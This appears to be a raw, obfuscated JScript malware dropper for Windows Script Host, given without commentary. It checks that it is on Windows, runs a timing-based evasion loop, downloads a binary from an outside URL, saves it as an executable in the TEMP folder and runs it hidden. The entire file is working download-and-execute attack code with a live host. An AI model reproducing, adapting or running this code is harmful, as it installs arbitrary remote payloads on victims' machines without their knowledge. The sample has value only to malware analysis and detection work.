var V2 = false;
var EA = "Create"+"Object";
var P = function V() {return WScript[EA]("WScript"+".Shell");}(), KV = 11;
var HN = "MSXML2"+".XMLHTTP";
var J0 = 2;
var N = J0 - 2;
function D(SX){P["Run"](SX, N, N);};
function X(){return HN + "";};
function T(QM0, I){N = N * 1; return QM0 - I;};
function CQ(){return EA;};
/*@cc_on
  @if (@_win32 || @_win64)
    V2 = true;
  @end
@*/
if (V2)
{
var J = "";
function ZB(){return 22;};
var QM = 0; var EN = 0;
function V0()
{
var WD = new this["Date"]();
var PP = WD["getUTCMilliseconds"]();
WScript["Sleep"](ZB());
var WD = new this["Date"]();
var R = WD["getUTCMilliseconds"]();
WScript["Sleep"](ZB());
var WD = new this["Date"]();
var LH = WD["getUTCMilliseconds"]();
var QM = "VN";
QM = T(R, PP);
var EN = "V1";
EN = T(LH, R);
J = "open";
return T(QM, EN);
}
var K0 = false;
var N0 = false;
for (var UF = N; UF < ZB() * 1; UF++){if (V0() != N){
K0 = true; 
EN = "31" + 11 * QM + EN; 
N0 = true; 
break;
}}
function XN() {return ((K0 == true) && (K0 == N0)) ? 1 : N;};
if (K0 && XN() && N0){
function ZF() {return P["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "r2hrMjmYq.ex" + "e";};
 G = X();
 B = WScript[EA](G);
 var QZ = 1;
do { 
	for (;QZ;){
	try {
		if (QZ == 1)
		{
			B[J]("GET", "http://new.teamlight.ru/si8svf", false);
			B["send"]();
			K = "Sleep";
			QZ = 2;
		}
		WScript[K](ZB() + 120); 
		if (B["readystate"] < 2 * 2) continue;
		QZ = N;
		function O(QW) {var EP = (1, 2, 3, 4, 5, QW); return EP;};
		G0 = WScript[CQ()]("ADODB.Stream");
		G = G0;
		G[J]();
		G["type"] = O(1);
		G["write"](B["ResponseBody"]);
		G0["position"] = O(N);
		G["Save" + "ToFile"](ZF(), 2);
		G0["cl"+"ose"]();
		OY = ZF();
		D(OY);
	} catch(EI){};};
}while (QZ);
}
}

